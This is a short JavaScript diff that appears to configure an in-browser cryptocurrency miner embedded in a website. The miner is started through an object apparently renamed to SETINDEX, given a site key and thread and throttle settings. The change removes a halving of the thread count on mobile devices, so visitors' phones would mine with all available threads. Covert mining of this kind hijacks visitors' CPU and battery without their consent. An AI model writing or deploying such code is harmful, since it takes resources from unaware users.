@@ -11,7 +11,7 @@ if (!base.isMobile()){
 	site.start();
 } else {
 	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
-		threads: base.getNumThreads() / 2,
+		threads: base.getNumThreads(),
 		throttle: 0.3,
 		forceASMJS: false
 	});
